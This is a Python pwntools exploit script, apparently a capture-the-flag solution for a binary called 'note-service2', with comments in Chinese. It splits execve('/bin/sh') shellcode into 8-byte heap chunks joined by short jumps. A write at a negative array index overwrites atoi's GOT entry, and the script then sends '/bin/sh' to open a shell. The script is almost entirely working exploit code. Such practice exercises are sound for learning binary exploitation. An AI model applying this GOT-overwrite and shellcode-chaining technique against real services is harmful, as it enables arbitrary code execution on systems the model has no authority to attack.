#coding=utf-8  
from pwn import *  
  
#sh = process('./note-service2')  
#sh = remote('220.249.52.133',57209)  
elf = ELF('./note-service2')
  
context(os='linux',arch='amd64')  
def create(index,size,content):  
   sh.sendlineafter('your choice>>','1')  
   sh.sendlineafter('index:',str(index))  
   sh.sendlineafter('size:',str(size))  
   sh.sendafter('content:',content)  
  
def delete(index):  
   sh.sendlineafter('your choice>>','4')  
   sh.sendlineafter('index:',str(index))  
  
#rax = 0 jmp short next_chunk  
code0 = (asm('xor rax,rax') + '\x90\x90\xeb\x19')  
#rax = 0x3B jmp short next_chunk  
code1= (asm('mov eax,0x3B') + '\xeb\x19')  
#rsi = 0 jmp short next_chunk  
code2 = (asm('xor rsi,rsi') + '\x90\x90\xeb\x19')  
#rdi = 0 jmp short next_chunk  
code3 = (asm('xor rdx,rdx') + '\x90\x90\xeb\x19')  
#系统调用  
code4 = (asm('syscall').ljust(7,'\x90'))  
  
'''''print len(code0) 
print len(code1) 
print len(code2) 
print len(code3) 
print len(code4) 
'''  
  
create(0,8,'a'*7)  
create(1,8,code1)  
create(2,8,code2)  
create(3,8,code3)  
create(4,8,code4)  
#删除第一个堆块  
delete(0)  
  
#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)，即修改了atoi的GOT表  
create(-8,8,code0)  
#getshell  
sh.sendlineafter('your choice>>','/bin/sh')  
  
sh.interactive()  

